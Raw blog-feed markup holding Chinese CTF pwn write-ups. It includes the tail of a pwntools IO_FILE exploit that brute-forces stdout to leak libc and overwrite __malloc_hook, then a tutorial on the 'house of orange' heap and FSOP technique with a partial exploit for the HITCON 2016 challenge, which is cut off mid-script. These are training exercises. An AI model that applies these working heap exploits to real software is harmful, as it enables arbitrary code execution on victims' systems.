class="number">5</span>)</span><br><span class="line"><span class="comment">#g()</span></span><br><span class="line"></span><br><span class="line">rename(<span class="number">0</span>,p64(<span class="number">0x0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line"></span><br><span class="line">rename(<span class="number">5</span>,<span class="string">&#x27;\xdd&#x27;</span>+<span class="string">&#x27;\x65&#x27;</span>)</span><br><span class="line"><span class="comment">#g()</span></span><br><span class="line">create(<span class="number">96</span>,<span class="number">5</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#g()</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">96</span>,<span class="number">9</span>,<span class="string">&#x27;\x00&#x27;</span>)  <span class="comment">#IO_2_1_stdout 此处爆破</span></span><br><span class="line"></span><br><span class="line">g()</span><br><span class="line"></span><br><span class="line">x = <span class="string">&#x27;\x00&#x27;</span> * (<span class="number">0x620</span>-<span class="number">0x5dd</span>-<span class="number">0x10</span>) + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&#x27;\x00&#x27;</span> <span class="comment">#IO_write_base改小</span></span><br><span class="line">rename(<span class="number">9</span>,x) </span><br><span class="line"></span><br><span class="line">g()</span><br><span class="line">sh.recvuntil(p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>)</span><br><span class="line">sh.recv(<span class="number">8</span>)</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">8</span>)) - <span class="number">131</span> -<span class="number">0x3c5620</span></span><br><span class="line"><span class="comment">#  &lt;_IO_2_1_stdout_+131&gt;</span></span><br><span class="line"></span><br><span class="line">print(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#g()</span></span><br><span class="line">malloc_hook = libc_base + <span class="number">0x3c4b10</span></span><br><span class="line"></span><br><span class="line">createX(<span class="number">96</span>,<span class="number">5</span>,<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#改完io之后puts完没有换行。。。</span></span><br><span class="line"></span><br><span class="line">deleteX(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">renameX(<span class="number">5</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line"><span class="comment">#g()</span></span><br><span class="line">createX(<span class="number">96</span>,<span class="number">5</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">createX(<span class="number">96</span>,<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x13</span> + p64(one_gadget[<span class="number">3</span>] + libc_base))</span><br><span class="line"><span class="comment">#g() </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(__name__ == <span class="string">&#x27;__main__&#x27;</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">sh  = process(<span class="string">&#x27;./Weapon&#x27;</span>)</span><br><span class="line"><span class="comment">#sh = remote(&quot;node3.buuoj.cn&quot;,&quot;27532&quot;)</span></span><br><span class="line">baopo()</span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">print(e)</span><br><span class="line">sh.close()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sh = process(&quot;./Weapon&quot;)</span></span><br><span class="line"><span class="string">baopo()</span></span><br><span class="line"><span class="string">sh.interactive()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><p>参考博客</p><p><a href="https://blog.csdn.net/qq_41202237/article/details/113845320?spm=1001.2014.3001.5501">https://blog.csdn.net/qq_41202237/article/details/113845320?spm=1001.2014.3001.5501</a></p><p><a href="https://blog.csdn.net/BengDouLove/article/details/106390373">https://blog.csdn.net/BengDouLove/article/details/106390373</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> IO_FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆利用之house of orange</title>
      <link href="/2021/11/03/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bhouse-of-orange/"/>
      <url>/2021/11/03/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bhouse-of-orange/</url>
      
        <content type="html"><![CDATA[<p> <em>头秃，看了好几天，感觉还是没有讲清楚，tcl，等以后有更好的理解时再来改改</em></p><p> <strong>利用情景：没有 free 函数</strong></p><p>不能释放堆空间，就很难泄露出我们想要的地址，但是 house of orange 可以解决此类问题，house of orange 由 地址泄露 + FSOP 两部分组成。</p><h2 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h2><p>当我们申请一块内存时，malloc 函数会检查各种 bin 是否满足，都不满足条件之后会检查 top chunk ，如果此时 top chunk 也不能满足，就会调用 sysmalloc 来申请内存。</p><p>sysmalloc 会有两种处理方式，一种是直接 mmap 一块内存，另一种是拓展 top chunk（brk）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If have mmap, and the request size meets the mmap threshold, and</span></span><br><span class="line"><span class="comment">   the system supports mmap, and there are few enough currently</span></span><br><span class="line"><span class="comment">   allocated mmapped regions, try to directly map this request</span></span><br><span class="line"><span class="comment">   rather than expanding top.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (mp_.mmap_threshold) &amp;&amp;</span><br><span class="line">    (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">char</span> *mm;           <span class="comment">/* return value from mmap call*/</span></span><br><span class="line">  try_mmap:</span><br></pre></td></tr></table></figure><p>这一段代码的意思是，如果申请大小 <code>&gt;= (unsigned long) (mp_.mmap_threshold)</code> ，就会调用 mmap ，而一般 <code>mmap_threshold</code> 大小为 128*1024（0x20000），我们申请的大小小于它就行。</p><p>接着会有两个 assert  函数检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">old_top = av-&gt;top;</span><br><span class="line">old_size = chunksize (old_top);</span><br><span class="line">old_end = (<span class="keyword">char</span> *) (chunk_at_offset (old_top, old_size));</span><br><span class="line"> </span><br><span class="line">brk = snd_brk = (<span class="keyword">char</span> *) (MORECORE_FAILURE);</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">   at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) old_end &amp; pagemask) == <span class="number">0</span>));</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE));</span><br></pre></td></tr></table></figure><p>要求修改的 <code>top_chunk_size</code> 必须满足</p><ol><li><code>top_chunk_size</code> &gt; MINSIZE（0x10）</li><li>top chunk inuse 位为1</li><li>修改之后的 size 必须要对齐到内存页（0x1000字节）</li><li><code>top_chunk_size</code>小于申请分配的内存即可</li></ol><p><em>举个例子，假设 top chunk 的地址位于 0x6030d0 并且他的大小为 0x20f31 ，我们就应该重写他的大小为 0xf31 来绕过那些assert，并再次申请 0x1000 大小的 chunk。</em></p><p>满足上述四个条件后，继续执行就会触发 <code>_int_free</code> 把原来的 top chunk 给 free 掉，并放入 unsorted bin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">top (av) = chunk_at_offset (heap, <span class="keyword">sizeof</span> (*heap));</span><br><span class="line">set_head (top (av), (heap-&gt;size - <span class="keyword">sizeof</span> (*heap)) | PREV_INUSE);</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Setup fencepost and free the old top chunk with a multiple of</span></span><br><span class="line"><span class="comment">  MALLOC_ALIGNMENT in size. */</span></span><br><span class="line"><span class="comment">/* The fencepost takes at least MINSIZE bytes, because it might</span></span><br><span class="line"><span class="comment">  become the top chunk again later.  Note that a footer is set</span></span><br><span class="line"><span class="comment">  up, too, although the chunk is marked in use. */</span></span><br><span class="line">old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">set_head (chunk_at_offset (old_top, old_size + <span class="number">2</span> * SIZE_SZ), <span class="number">0</span> | PREV_INUSE);</span><br><span class="line"><span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line"> &#123;</span><br><span class="line">   set_head (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">   set_foot (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ));</span><br><span class="line">   set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">   _int_free (av, old_top, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>此时我们已经得到了一个 unsorted bin ，当我们再次申请 unsorted bin 范围内的堆时，就会在 unsorted bin 中切割，同时也能泄露 libc 地址了。</p><p>需要注意的是，当我们再次分配堆的大小是 <code>large_chunk</code>（大于512字节） ，old_chunk 的堆地址会被放进堆中，也就是说我们既可以泄露 libc ，又能泄露出堆地址。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-orange/1635925124172582/6adb814eb3c1d230572acca3dc5d62e692e694f3.png" alt="1"></p><h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>和 rop 很像，也是一种劫持程序流程的方式，只是攻击 File Stream来实现罢了。</p><h3 id="unsortbin-attack-劫持"><a href="#unsortbin-attack-劫持" class="headerlink" title="unsortbin attack 劫持"></a>unsortbin attack 劫持</h3><p><code>Unsorted bin chunk</code>摘除代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>只看最后两行就行，<code>unsorted_chunk</code> 的<code>bk</code>指针指向的是它后一个被释放的 chunk 的块地址（bck），后一个被释放的chunk 的<code>fd</code>指针指向的是<code>unsorted_chunk</code>的块地址，如果我们能够控制<code>unsorted_chunk</code>的<code>bk</code>，那么就意味着可以将<code>unsorted_chunks (av)</code>，即<code>unsorted_chunk</code>的块地址写到任意可写地址内。</p><p>攻击之前布局</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-orange/1636028792269345/676223590900290aa3617ef9de4ad25352001180.png" alt="image-20211104202631960"></p><p>我们将<code>_IO_list_all-0x10</code>伪造成<code>bk</code>，那么此时<code>bck-&gt;fd = _IO_list_all = unsorted_chunks (av) = main_arena + 88</code></p><p>此时的  main_arena+88 相当于一个  IO_file_plus 结构，但是这里面的内容我们是不能完全控制的，但是 IO_file_plus 结构中还有个 _chain 指针，它位于 IO_file_plus+0x68 处，指向了下一个 IO_file_plus 结构体，像单链表一样串起来的。那么 _chain 在这就相当于 main_arena+88 + 0x68 = main_arena + 0xC0 处，而 main_arena + 0xC0 存储着的是 small bin 的头地址。所以，我们要让 main_arena + 0xC0 指向一个我们可控的地方，然后在那里伪造第二个 IO_file_plus 结构，即通过转移，让它转移到我们可控的地方。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-orange/1636030154919522/bef45e53bde9a01d902c73a455c4a7a2eeb59b27.png" alt="image-20211104204914735"></p><p>我们可以把 unsorted bin 的头结点的 size 改成 0x60 ，这样当我们调用 malloc ，glibc 会整理 unsorted bin ，把其放入 small bin 中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *  </span><br><span class="line">_int_malloc (mstate av, <span class="keyword">size_t</span> bytes)  </span><br><span class="line">&#123;  </span><br><span class="line"><span class="comment">/* remove from unsorted list */</span>  </span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;  </span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span>  </span><br><span class="line">  </span><br><span class="line">          <span class="keyword">if</span> (size == nb)  </span><br><span class="line">            &#123;  </span><br><span class="line">              set_inuse_bit_at_offset (victim, size);  </span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)  </span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;  </span><br><span class="line">              check_malloced_chunk (av, victim, nb);  </span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);  </span><br><span class="line">              alloc_perturb (p, bytes);  </span><br><span class="line">              <span class="keyword">return</span> p;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">/* place chunk in bin */</span>  </span><br><span class="line">  </span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))  </span><br><span class="line">            &#123;  </span><br><span class="line">              victim_index = smallbin_index (size);  <span class="comment">//victim_index=6</span></span><br><span class="line">              bck = bin_at (av, victim_index);  <span class="comment">//bck=&amp;av-&gt;bins[10]-0x10</span></span><br><span class="line">              fwd = bck-&gt;fd;  <span class="comment">//fwd=&amp;av-&gt;bins[10]</span></span><br><span class="line">            &#125;  </span><br><span class="line">...  </span><br><span class="line">mark_bin (av, victim_index);  </span><br><span class="line">victim-&gt;bk = bck;  </span><br><span class="line">victim-&gt;fd = fwd;  </span><br><span class="line">fwd-&gt;bk = victim;<span class="comment">//&amp;av-&gt;bins[10]+0x18 = old_top  </span></span><br><span class="line">bck-&gt;fd = victim; </span><br><span class="line"> </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>main_arena 结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">  <span class="comment">/* Serialize access.  */</span>  </span><br><span class="line">  <span class="keyword">mutex_t</span> mutex;  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span>  </span><br><span class="line">  <span class="keyword">int</span> flags;  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Fastbins */</span>  </span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span>  </span><br><span class="line">  mchunkptr top;  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span>  </span><br><span class="line">  mchunkptr last_remainder;  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span>  </span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span>  </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Linked list */</span>  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized </span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span>  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on </span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by </span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span>  </span><br><span class="line">  INTERNAL_SIZE_T attached_threads;  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span>  </span><br><span class="line">  INTERNAL_SIZE_T system_mem;  </span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;  </span><br><span class="line">&#125;;  </span><br></pre></td></tr></table></figure><p>av-&gt;bins[10]+0x18 = main_arena + 0x58 + 0x8*10 + 0x18 = main_arena + 0xC0 = old_top</p><p>我们让unsorted bin的size为0x60，是为了让chain指针正好重新指回来，指向我们可控的地方。</p><h3 id="malloc-函数报错处理"><a href="#malloc-函数报错处理" class="headerlink" title="malloc 函数报错处理"></a>malloc 函数报错处理</h3><p>先要了解 <code>malloc</code> 函数报错时的处理，<code>malloc_printerr</code>是<code>malloc</code>中用来打印错误的函数。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-orange/1635948632210341/fcebe0fcfe89eab79ecd203ccc435bc1d3be2247.png" alt="1"></p><p><code>malloc_printerr</code>函数其实是调用<code>__libc_message</code>函数之后又调用<code>abort</code>函数，<code>abort</code>函数其中调用了<code>_IO_flush_all_lockp</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">…</span><br><span class="line">    fp = fp-&gt;_chain;</span><br><span class="line">    ...</span><br><span class="line">          <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<span class="comment">/*我们需要构造满足条件*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<span class="comment">/*从_IO_list_all指向的FILE结构开始查找，找到合适_IO_FILE作为_IO_OVERFLOW的参数，执行vtable里面的函数，把IO_FILE结构体本身作为参数*/</span>  </span><br></pre></td></tr></table></figure><p>如果满足以下条件：</p><ol><li><p>fp-&gt;<em>mode &gt; 0</em></p></li><li><p>_IO_vtable_offset (fp) == 0</p></li><li><p>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</p><p>就会调用  _IO_OVERFLOW ，并把结构体当做第一个参数传入<br>如果我们能够把  _IO_OVERFLOW 改为 system ，并且伪造结构体，开头为 /bin/sh ，就能获得 shell 了</p></li></ol><hr><p>简言之</p><ol><li>利用堆溢出将 top chunk size 改小,使其进入 unsorted bin 泄露地址</li><li>在 unsorted bin 伪造使 size 变为 0x60 ，并伪造出一个 io_file 结构</li></ol><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>buu  houseoforange_hitcon_2016</p><p>这题可以说是 house of orange 里的代表了，可以说上面每个手法都利用到了</p><p>程序没有 free 函数，有堆溢出并能改到 top chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">sh = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"><span class="comment">#sh = remote(&#x27;node4.buuoj.cn&#x27;,29741)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;2.23/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span>(<span class="params">size,name</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Length of name :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Name :&#x27;</span>,name)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Price of Orange:&#x27;</span>,<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Color of Orange:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">size,name</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Length of name :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Name:&#x27;</span>,name)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Price of Orange:&#x27;</span>,<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Color of Orange:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">build(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line"><span class="comment">#修改top chunk的size为0xF80</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xF80</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#申请一个比top chunk的size大的空间，那么top chunk会被放入unsorted bin</span></span><br><span class="line">build(<span class="number">0x1000</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">build(<span class="number">0x400</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line"><span class="comment">#接下来申请unsorted bin里的chunk，泄露libc地址和堆地址</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Name of house : &#x27;</span>)</span><br><span class="line">leak = u64(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">io_list_all = (leak &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + (libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>] &amp; <span class="number">0xFFF</span>)</span><br><span class="line">libcbase = io_list_all - libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#这边算出的 io_list_all 地址是错的</span></span><br><span class="line"><span class="string">sh.recvuntil(&#x27;Name of house : &#x27;)</span></span><br><span class="line"><span class="string">leak = u64(sh.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="string">print &quot;leak: &quot; + hex(leak)</span></span><br><span class="line"><span class="string">libcbase = leak -4451</span></span><br><span class="line"><span class="string">print &quot;libcbase: &quot; + hex(libcbase)</span></span><br><span class="line"><span 